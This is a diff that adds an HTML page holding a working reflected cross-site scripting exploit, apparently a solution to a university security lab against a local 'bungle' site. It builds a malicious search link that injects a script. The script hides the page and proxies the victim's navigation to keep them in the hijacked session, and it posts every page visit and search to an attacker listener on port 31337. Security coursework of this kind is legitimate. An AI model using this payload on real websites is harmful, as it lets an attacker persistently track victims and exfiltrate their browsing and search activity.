@@ -1,0 +1,47 @@
+<meta charset="utf-8">
+<script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+<script>
+
+function payload(attacker) {
+    function log(data) {
+        console.log($.param(data))
+        $.post(attacker, data);
+    }
+    function proxy(href) {
+        $("html").load(href, function(){
+            window.history.pushState({page: 1}, "page 1", href);
+            $("html").show();
+            log({event: "nav", uri: href});
+            $("#bungle-lnk").attr("href", "./" + url);
+            if(href == "./") {
+                $("#search-btn").attr("type", "button");
+                $("#search-btn").click(function() {
+                    proxy("./search?q=" + $("#query").val());
+                });
+            }
+            else {
+                $("a:contains('<script>')").remove();
+                $("#search-again-btn").attr("href", "./" + url);
+            }
+        });
+    }
+    $("html").hide();
+    proxy("./");
+}
+
+function makeLink(xssdefense, target, attacker) {
+    return target + "./search?csrfdefence=0&xssdefense=" + xssdefense.toString() + "&q=" + 
+        encodeURIComponent("<script" + ">" + "var url = window.location.href.substring(\"http://127.0.0.1/project2/\".length); " + payload.toString() + ";payload(\"" + 
+        attacker + "\");" + "<" + "/script" + ">");
+}
+
+var xssdefense = 0;
+var target = "http://127.0.0.1/project2/";
+var attacker = "http://127.0.0.1:31337/";
+
+$(function() {
+    var url = makeLink(xssdefense, target, attacker);
+    window.location.href = url;
+});
+
+</script>
